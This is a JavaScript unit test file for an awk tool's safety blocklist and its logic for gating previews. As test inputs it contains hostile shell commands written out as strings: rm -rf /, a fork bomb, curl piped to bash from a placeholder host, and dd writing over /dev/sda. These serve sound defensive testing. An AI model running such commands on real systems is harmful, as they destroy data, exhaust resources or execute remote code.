// @ts-check
// Unit tests for public/js/safety.js — the preview-gating + forbidden-
// patterns blocklist that runs BEFORE awk is invoked.
//
// SAFETY NOTE — IMPORTANT
// -----------------------
// These tests are STATIC STRING MATCHING only. No test here spawns a
// shell, runs awk, or otherwise interprets the "forbidden" programs as
// executable code. Every test feeds a dangerous-looking string into
// `findForbiddenMatches` (a pure regex matcher) or `shouldGatePreview`
// (pure boolean logic over tokenized input) and asserts on the
// RETURNED DATA STRUCTURE — we never observe side-effects on the
// filesystem, processes, or network. Patterns like `rm -rf /` appear
// as JavaScript string literals that the matcher reads character by
// character; at no point does Node hand them to a shell.
//
// If you add tests here, preserve that invariant: pass the dangerous
// string as a literal to one of the exported functions, assert on the
// returned object, and never pass it to `child_process`, `Function`,
// `eval`, or a fetch.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  DEFAULT_FORBIDDEN_PATTERNS,
  findForbiddenMatches,
  shouldGatePreview,
  isSafetyBlockedStderr,
  describeForbiddenHit,
  SAFETY_BLOCKED_PREFIX,
} from '../../public/js/safety.js';

// ---------------------------------------------------------------- //
// findForbiddenMatches — regex-based blocklist matcher
// ---------------------------------------------------------------- //

test('findForbiddenMatches: empty pattern list returns no hits', () => {
  const hits = findForbiddenMatches('system("rm -rf /")', null, []);
  assert.deepEqual(hits, []);
});

test('findForbiddenMatches: empty program with some patterns returns no hits', () => {
  const hits = findForbiddenMatches('', null, ['\\brm\\s+-rf\\b']);
  assert.deepEqual(hits, []);
});

test('findForbiddenMatches: matches the rm -rf / pattern from defaults', () => {
  // The DEFAULTS are checked against a program string. No shell is ever
  // involved — the string is matched by a case-insensitive regex.
  const program = 'system("rm -rf /")';
  const hits = findForbiddenMatches(program, null, DEFAULT_FORBIDDEN_PATTERNS);
  assert.ok(hits.length > 0, 'expected at least one hit for rm -rf /');
  assert.equal(hits[0].where, 'awk program');
  assert.ok(hits[0].match.includes('rm'));
});

test('findForbiddenMatches: case-insensitive matching (uppercase still hits)', () => {
  const hits = findForbiddenMatches(
    'system("RM -RF /")',
    null,
    DEFAULT_FORBIDDEN_PATTERNS,
  );
  assert.ok(hits.length > 0, 'uppercase rm -rf / should still match');
});

test('findForbiddenMatches: does NOT match rm -rf ./build (relative path)', () => {
  // The default pattern targets `/`, `~`, `$HOME` — a local relative
  // path should pass through.
  const hits = findForbiddenMatches(
    'system("rm -rf ./build")',
    null,
    DEFAULT_FORBIDDEN_PATTERNS,
  );
  // Filter to hits from the rm-related pattern (first non-comment line).
  const rmHits = hits.filter((h) => h.pattern.includes('rm'));
  assert.deepEqual(rmHits, [], 'rm -rf ./build is safe and should not trip the filter');
});

test('findForbiddenMatches: matches fork-bomb idiom', () => {
  const program = 'BEGIN { system(":(){ :|:& };:") }';
  const hits = findForbiddenMatches(program, null, DEFAULT_FORBIDDEN_PATTERNS);
  assert.ok(hits.some((h) => h.match.includes(':')), 'fork bomb should match');
});

test('findForbiddenMatches: matches curl | sh fetch-and-execute', () => {
  const program = 'BEGIN { system("curl -fsSL https://x.example | bash") }';
  const hits = findForbiddenMatches(program, null, DEFAULT_FORBIDDEN_PATTERNS);
  assert.ok(hits.length > 0, 'curl | bash should be blocked');
});

test('findForbiddenMatches: matches dd writing to a block device', () => {
  const program = 'BEGIN { system("dd if=/dev/zero of=/dev/sda") }';
  const hits = findForbiddenMatches(program, null, DEFAULT_FORBIDDEN_PATTERNS);
  assert.ok(hits.length > 0, 'dd of=/dev/sda should be blocked');
});

test('findForbiddenMatches: does NOT match dd writing to a file (loopback image)', () => {
  const program = 'BEGIN { system("dd if=/dev/zero of=./disk.img") }';
  const hits = findForbiddenMatches(program, null, DEFAULT_FORBIDDEN_PATTERNS);
  const ddHits = hits.filter((h) => h.pattern.includes('dd'));
  assert.deepEqual(ddHits, [], 'dd to a file is safe');
});

test('findForbiddenMatches: also scans variable values, not just the program', () => {
  // The vars map represents `-v NAME=VALUE` assignments. A forbidden
  // pattern in a variable value should also be caught (a snippet could
  // construct a dangerous system() arg from user-supplied params).
  const program = 'BEGIN { system(danger) }';
  const vars = { danger: 'rm -rf /' };
  const hits = findForbiddenMatches(program, vars, DEFAULT_FORBIDDEN_PATTERNS);
  const varHit = hits.find((h) => h.where.startsWith('variable'));
  assert.ok(varHit, 'should hit on the variable value');
  assert.equal(varHit.where, 'variable "danger"');
});

test('findForbiddenMatches: ignores # comment lines in the pattern list', () => {
  // The default list uses `#`-prefixed lines as human-readable section
  // headers. They must not be compiled as regexes.
  const patterns = ['# this is a comment', '\\bdangerous\\b'];
  const hits = findForbiddenMatches('dangerous', null, patterns);
  assert.equal(hits.length, 1, 'only the non-comment pattern should match');
  assert.equal(hits[0].pattern, '\\bdangerous\\b');
});

test('findForbiddenMatches: ignores empty/whitespace-only patterns', () => {
  const patterns = ['', '   ', '\t', '\\bdangerous\\b'];
  const hits = findForbiddenMatches('dangerous', null, patterns);
  assert.equal(hits.length, 1);
});

test('findForbiddenMatches: invalid regex is skipped, not thrown', () => {
  // A user could paste a broken pattern into Settings; we must not
  // crash the gate — the bad entry is dropped and others still apply.
  // Swallow the console.warn call so the test output stays clean.
  const originalWarn = console.warn;
  console.warn = () => {};
  try {
    const patterns = ['[unclosed', '\\bsafe\\b'];
    const hits = findForbiddenMatches('safe', null, patterns);
    assert.equal(hits.length, 1, 'valid pattern still matches');
    assert.equal(hits[0].pattern, '\\bsafe\\b');
  } finally {
    console.warn = originalWarn;
  }
});

test('findForbiddenMatches: returns one entry per (pattern, location) pair', () => {
  // Same pattern hit in both program and vars produces two distinct
  // entries so the UI can report each location.
  const program = 'dangerous';
  const vars = { payload: 'dangerous' };
  const hits = findForbiddenMatches(program, vars, ['\\bdangerous\\b']);
  assert.equal(hits.length, 2);
  assert.ok(hits.some((h) => h.where === 'awk program'));
  assert.ok(hits.some((h) => h.where === 'variable "payload"'));
});

test('findForbiddenMatches: null/undefined patterns parameter is a no-op', () => {
  assert.deepEqual(findForbiddenMatches('rm -rf /', null, null), []);
  assert.deepEqual(findForbiddenMatches('rm -rf /', null, undefined), []);
});

test('findForbiddenMatches: non-string var values are skipped silently', () => {
  // vars objects come from a UI that should normalize to strings, but
  // a hand-crafted import could carry a number / bool — don't explode.
  const vars = /** @type {any} */ ({ count: 42, flag: true, text: 'dangerous' });
  const hits = findForbiddenMatches('', vars, ['\\bdangerous\\b']);
  assert.equal(hits.length, 1);
  assert.equal(hits[0].where, 'variable "text"');
});

// ---------------------------------------------------------------- //
// shouldGatePreview — the preview auto-run decision
// ---------------------------------------------------------------- //

test('shouldGatePreview: empty programs with no options → not gated', () => {
  const r = shouldGatePreview(['']);
  assert.equal(r.gated, false);
  assert.equal(r.manualOnly, false);
  assert.deepEqual(r.effects, []);
});

test('shouldGatePreview: safe program → not gated', () => {
  const r = shouldGatePreview(['{ print toupper($0) }']);
  assert.equal(r.gated, false);
  assert.deepEqual(r.effects, []);
});

test('shouldGatePreview: side-effecting program → gated by default', () => {
  const r = shouldGatePreview(['{ system("echo hi") }']);
  assert.equal(r.gated, true);
  assert.equal(r.manualOnly, false);
  assert.ok(r.effects.length > 0, 'effects list should describe the side effect');
});

test('shouldGatePreview: side-effecting program with autoPreview opt-in → not gated', () => {
  const r = shouldGatePreview(
    ['{ system("echo hi") }'],
    { autoPreviewSideEffects: true },
  );
  assert.equal(r.gated, false);
});

test('shouldGatePreview: requireManualPreview wins over side-effect opt-in', () => {
  // User asked for strict "always prompt"; the side-effect escape hatch
  // must not override that.
  const r = shouldGatePreview(
    ['{ print }'],
    { requireManualPreview: true, autoPreviewSideEffects: true },
  );
  assert.equal(r.gated, true);
  assert.equal(r.manualOnly, true);
  assert.deepEqual(r.effects, [], 'manualOnly path skips the side-effect scan');
});

test('shouldGatePreview: requireManualPreview gates even a safe program', () => {
  const r = shouldGatePreview(['{ print }'], { requireManualPreview: true });
  assert.equal(r.gated, true);
  assert.equal(r.manualOnly, true);
});

test('shouldGatePreview: scans across every program in the list (chain)', () => {
  // Chain preview passes all step programs; any one with a side effect
  // gates the whole preview.
  const r = shouldGatePreview([
    '{ print toupper($0) }',
    '{ print tolower($0) }',
    '{ system("echo hi") }',
  ]);
  assert.equal(r.gated, true);
  assert.ok(r.effects.some((e) => e.includes('system')));
});

// ---------------------------------------------------------------- //
// describeForbiddenHit + isSafetyBlockedStderr
// ---------------------------------------------------------------- //

test('describeForbiddenHit: renders a stderr message starting with the stable prefix', () => {
  const hit = { pattern: '\\bbad\\b', where: 'awk program', match: 'bad' };
  const msg = describeForbiddenHit(hit);
  assert.ok(msg.startsWith(SAFETY_BLOCKED_PREFIX));
  assert.ok(msg.includes('\\bbad\\b'));
  assert.ok(msg.includes('bad'));
});

test('isSafetyBlockedStderr: recognises the describeForbiddenHit output', () => {
  const hit = { pattern: '\\bbad\\b', where: 'awk program', match: 'bad' };
  const msg = describeForbiddenHit(hit);
  assert.equal(isSafetyBlockedStderr(msg), true);
});

test('isSafetyBlockedStderr: rejects unrelated stderr', () => {
  assert.equal(isSafetyBlockedStderr('awk: syntax error at line 1'), false);
  assert.equal(isSafetyBlockedStderr(''), false);
  assert.equal(isSafetyBlockedStderr(null), false);
  assert.equal(isSafetyBlockedStderr(undefined), false);
});
